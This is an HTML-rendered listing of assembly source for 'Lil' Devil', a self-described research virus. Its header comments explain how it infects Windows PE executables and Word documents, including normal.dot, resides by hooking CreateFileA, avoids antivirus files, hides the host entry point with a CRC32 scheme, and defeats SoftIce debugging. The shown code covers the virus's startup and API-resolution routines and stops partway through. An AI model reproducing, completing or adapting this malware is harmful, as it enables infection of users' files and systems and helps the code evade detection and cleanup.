<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>lildevil.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Lil' Devil</span><span class="sc0">
</span><span class="sc1">;  Coded by Bumblebee</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  DISCLAIMER</span><span class="sc0">
</span><span class="sc1">;  .This is the source code of a VIRUS. The  author  is not responsa-</span><span class="sc0">
</span><span class="sc1">;  bile of any damage that may occur due  to  the  assembly  of  this</span><span class="sc0">
</span><span class="sc1">;  file. Use it at your own risk.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Contents</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  1. Introduction</span><span class="sc0">
</span><span class="sc1">;  2. Features</span><span class="sc0">
</span><span class="sc1">;  3. Item Infection</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  1. Introduction</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  .This is a little research  virus that infects both PE EXE and DOC</span><span class="sc0">
</span><span class="sc1">;  files from ms word, including  normal.dot template. Not  optimized</span><span class="sc0">
</span><span class="sc1">;  at all, and with very lame vbs/wm code :/ I'm mainly ASM coder!</span><span class="sc0">
</span><span class="sc1">;  The idea is to add macro spreading to a average PE infector trying</span><span class="sc0">
</span><span class="sc1">;  to do it making the PE form of the virus as small as possible. For</span><span class="sc0">
</span><span class="sc1">;  this issue i'm going to use vbs to infect normal.dot, due this wsh</span><span class="sc0">
</span><span class="sc1">;  is required for dot infection (not for  PE  drop if there is a doc</span><span class="sc0">
</span><span class="sc1">;  infected, and of coz PE infection has nothing to be with vbs).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Even you've seen some part of this virus into Yonggary!, there are</span><span class="sc0">
</span><span class="sc1">;  some interesting things i'm sure you wanna check :) (like bug fix)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  2. Features</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  .Has a runtime part that will infect current and windows folder.</span><span class="sc0">
</span><span class="sc1">;  .Infects PE files with at least 8000h bytes with EXE and SCR exts.</span><span class="sc0">
</span><span class="sc1">;  Infects appending virus body to the  end  of  the last section. It</span><span class="sc0">
</span><span class="sc1">;  takes care of virtual size and phys size data in the header,  that</span><span class="sc0">
</span><span class="sc1">;  is why the size of infected files increases more than other  virii</span><span class="sc0">
</span><span class="sc1">;  that doesn't take care of this. In other hand  it  makes the virus</span><span class="sc0">
</span><span class="sc1">;  infection more stable. It  uses size padding as infection sign. It</span><span class="sc0">
</span><span class="sc1">;  won't infect already infected files even size padding check fails.</span><span class="sc0">
</span><span class="sc1">;  .Avoids infect files that contains in body the  strings: 'tractor'</span><span class="sc0">
</span><span class="sc1">;  (self extractor archives) or 'ntivir' (antivirus software).</span><span class="sc0">
</span><span class="sc1">;  .Per-process resident by hooking CreateFileA. It checks the folder</span><span class="sc0">
</span><span class="sc1">;  used in the  calls (not file). It will infect all the  PE files in</span><span class="sc0">
</span><span class="sc1">;  this folder.</span><span class="sc0">
</span><span class="sc1">;  .Self CRC32 checksum implemented. Encrypts saved host EP with this</span><span class="sc0">
</span><span class="sc1">;  value. Since CRC32 is not stored, avers will need to calc CRC32 of</span><span class="sc0">
</span><span class="sc1">;  virus is order to  clean the  infected files. Self integrity check</span><span class="sc0">
</span><span class="sc1">;  will work also as kinda anti-debug feature.</span><span class="sc0">
</span><span class="sc1">;  .Has Softice  detection for win9x/win2k that will halt the process</span><span class="sc0">
</span><span class="sc1">;  with a stack fault.</span><span class="sc0">
</span><span class="sc1">;  .Contains a RLE compressed PE  dropper and a vbs script  that will</span><span class="sc0">
</span><span class="sc1">;  install word macros in the normal template. The word macro part is</span><span class="sc0">
</span><span class="sc1">;  full working macro  virus that will infect DOC files and will dump</span><span class="sc0">
</span><span class="sc1">;  and execute the PE dropper. The wm is generated on the fly.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  3. Item Infection</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  .Virus working scheme:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      PE --- PE dropper, infect, vbs dropper --&gt; DOT</span><span class="sc0">
</span><span class="sc1">;        \--&gt; PE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      DOT --&gt; DOC</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      DOC --&gt; PE dropper --&gt; PE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  .The dropper is uncompressed into &lt;WINDOWS FOLDER&gt;/ldevrtl.dll and</span><span class="sc0">
</span><span class="sc1">;  infected. After that the  vbs dropper will be dumped into the file</span><span class="sc0">
</span><span class="sc1">;  &lt;WINDOWS FOLDER&gt;/ldevwm.vbs. Then the  macros  will  be  generated</span><span class="sc0">
</span><span class="sc1">;  into c:\ldev.sys. This wm will be used to infect  all docs and the</span><span class="sc0">
</span><span class="sc1">;  normal.dot. At  last the vbs  dropper will be  executed to install</span><span class="sc0">
</span><span class="sc1">;  the macros inside normal.dot. This won't  happen  again  while the</span><span class="sc0">
</span><span class="sc1">;  ldevrtl.dll exists. The  dropper  into  the  wm  won't  infect the</span><span class="sc0">
</span><span class="sc1">;  normal.dot, just infect PE  into  windows  and current folder. The</span><span class="sc0">
</span><span class="sc1">;  virus samples from  this  copy  will be able to infect word again.</span><span class="sc0">
</span><span class="sc1">;  .Even i've tried to not overload the system, the virus is not 100%</span><span class="sc0">
</span><span class="sc1">;  perfect. Just think what happens if word is running when we try to</span><span class="sc0">
</span><span class="sc1">;  infect normal.dot...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Thanx once again to Perikles for his tests. This  virus was quite</span><span class="sc0">
</span><span class="sc1">;  hard to test :) Nice work. He found  a stupid  bug i've incuded in</span><span class="sc0">
</span><span class="sc1">;  two old viruses: the way to low-case (don't rely  in  my  previous</span><span class="sc0">
</span><span class="sc1">;  lame 'or &lt;reg&gt;,202020h'). Also he  helped  a  lot  providing  with</span><span class="sc0">
</span><span class="sc1">;  infected samples to Balck Jack for the following tests.</span><span class="sc0">
</span><span class="sc1">;   Thanx you friend!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    After i released the bin Black Jack did some tests under Win NT</span><span class="sc0">
</span><span class="sc1">;   with SP 5. He noticed infected prodump 'is not a valid win32 app'</span><span class="sc0">
</span><span class="sc1">;   even it runs nice under win98. Later he tested infected  mlink32</span><span class="sc0">
</span><span class="sc1">;   and it run without  problems.  procdump  has  a  quite  uncommon</span><span class="sc0">
</span><span class="sc1">;   last section attribute: discardable. We didn't get a good reason</span><span class="sc0">
</span><span class="sc1">;   to say why infected procdump didn't work under BJ's nt.  As  2nd</span><span class="sc0">
</span><span class="sc1">;   infected sample shown, last section huge virtual size is not the</span><span class="sc0">
</span><span class="sc1">;   problem. Sigh... i need to install win nt :/ Thanx  Black  Jack!</span><span class="sc0">
</span><span class="sc1">;    After speaking with Vecna we found the way i  calc  image  size</span><span class="sc0">
</span><span class="sc1">;   is kinda unstable hehehe. So this is the reason :) Keep this  in</span><span class="sc0">
</span><span class="sc1">;   mind when reading the PE infection routine.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    Another thing you should know is some av detect it as  Yonggary</span><span class="sc0">
</span><span class="sc1">;   modification, and some detect it as  Yonggary  itself.  It's  my</span><span class="sc0">
</span><span class="sc1">;   fault coz i didn't tested av before releasing this virus. Indeed</span><span class="sc0">
</span><span class="sc1">;   this is at date of release. I spect after av ppl get a  infected</span><span class="sc0">
</span><span class="sc1">;   sample they will fix it (even detect it as Yonggary variant,  at</span><span class="sc0">
</span><span class="sc1">;   least they will detect it as  the  right  variant).  This  is  a</span><span class="sc0">
</span><span class="sc1">;   research virus, not spected to be itw.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                                  The way of the bee</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc2">.486p</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">STDCALL</span><span class="sc0">

        </span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">        </span><span class="sc1">; needed for 1st generation</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc1">; from BC++ Win32 API on-line Reference</span><span class="sc0">
</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">         </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">dwFileAttributes</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dwLowDateTime0</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; creation</span><span class="sc0">
</span><span class="sc5">dwHigDateTime0</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dwLowDateTime1</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; last access</span><span class="sc0">
</span><span class="sc5">dwHigDateTime1</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dwLowDateTime2</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; last write</span><span class="sc0">
</span><span class="sc5">dwHigDateTime2</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">nFileSizeHigh</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">nFileSizeLow</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dwReserved</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">cFileName</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">cAlternateFilename</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">         </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">vSize</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">vEnd</span><span class="sc4">-</span><span class="sc5">vBegin</span><span class="sc0">
</span><span class="sc5">vVSize</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">vVEnd</span><span class="sc4">-</span><span class="sc5">vBegin</span><span class="sc0">
</span><span class="sc5">PADDING</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">101</span><span class="sc0">
</span><span class="sc5">MAXSTRING</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">256</span><span class="sc0">

</span><span class="sc1">; my little debug macro with hardcoded addr for my system</span><span class="sc0">
</span><span class="sc5">@debug</span><span class="sc0">   </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc9">title</span><span class="sc4">,</span><span class="sc5">reg</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@tit</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">title</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@tit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">reg</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0bff5412eh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc9">.DATA</span><span class="sc0">
        </span><span class="sc1">; dummy data</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'WARNING - This is a virus carrier - WARNING'</span><span class="sc0">

</span><span class="sc9">.CODE</span><span class="sc0">
</span><span class="sc5">inicio</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">vBegin</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">; setup self CRC32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">vSize</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">                     </span><span class="sc1">; for 1st generation</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hostEP</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; hide host entry point</span><span class="sc0">

</span><span class="sc9">align</span><span class="sc0">   </span><span class="sc2">200h</span><span class="sc0">    </span><span class="sc1">; ignore tasm warning</span><span class="sc0">
</span><span class="sc5">vBegin</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fakeHost</span><span class="sc0">
</span><span class="sc5">hostEP</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc1">; begin startup code</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getDelta</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">vBegin</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">; check self CRC32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">vSize</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">                     </span><span class="sc1">; it's ok</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; restore host entry point</span><span class="sc0">
                                                </span><span class="sc1">; if CRC32 fails the</span><span class="sc0">
                                                </span><span class="sc1">; entry point will be faked</span><span class="sc0">
        </span><span class="sc1">; relocation stuff</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vBegin</span><span class="sc0">               </span><span class="sc1">; this allows infect</span><span class="sc0">
</span><span class="sc5">virusEP</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                             </span><span class="sc1">; relocatable hosts</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">vBegin</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">baseAddr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; setup SEH frame</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">GetKernel32Exception</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">GetKernel32Loop</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; loop to get Kernel32 addr</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">             </span><span class="sc1">; check is EXE</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">GetKernel32Loop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; check has a right header</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0f800h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">GetKernel32Loop</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; check addr fit in header</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">GetKernel32Loop</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; remove SEH frame</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                                                </span><span class="sc1">; now edi has k32 addr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; get API addr using CRC32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">address</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">names</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ordinals</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">nexports</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">expcount</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FSTAPI</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc5">searchl</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">names</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">fFound</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">expcount</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
